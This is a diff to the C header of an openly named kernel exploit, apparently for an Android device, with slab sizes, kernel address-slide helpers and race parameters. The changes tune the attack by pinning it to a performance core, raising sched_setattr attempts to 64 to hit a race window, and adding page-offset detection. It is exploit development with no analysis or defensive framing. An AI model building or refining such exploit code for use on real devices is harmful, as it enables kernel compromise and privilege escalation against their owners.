@@ -52,7 +52,7 @@
 #define MM_STRUCT_SZ 0x500
 #define MM_ORDER 3
 #define MM_PARTIALS 5
-#define CORE 0
+#define CORE 4  /* Use performance core (Cortex-A720 3.53GHz) instead of efficiency */
 #define KSNITCH_COLLISIONS 4
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
@@ -113,10 +113,10 @@
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
 #define CONSUMER_CORE (CORE + 1)
-#define CONSUMER_MAX_CALLS 1
+#define CONSUMER_MAX_CALLS 64  /* More sched_setattr attempts to hit race window */
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
-#define PSELECT_CONSUMER_BURST_CALLS 1
+#define PSELECT_CONSUMER_BURST_CALLS 4  /* Multiple burst calls per iteration */
 #ifndef PSELECT_ENTER_DELAY_USEC
 #define PSELECT_ENTER_DELAY_USEC 50000
 #endif
@@ -270,12 +270,16 @@ extern uint64_t slide_bootid_after;
 extern uint64_t slide_bootid_want;
 extern ssize_t slide_bootid_restore_ret;
 extern uintptr_t slide_p0_offset;
+extern uintptr_t runtime_page_offset;
+int slide_determine_page_offset(void);
 extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
 void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
 void disable_rseq_for_thread(void);
+void log_slide_child_context(void);
+uint64_t fdset_get_word(const fd_set *set, int word);
 long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
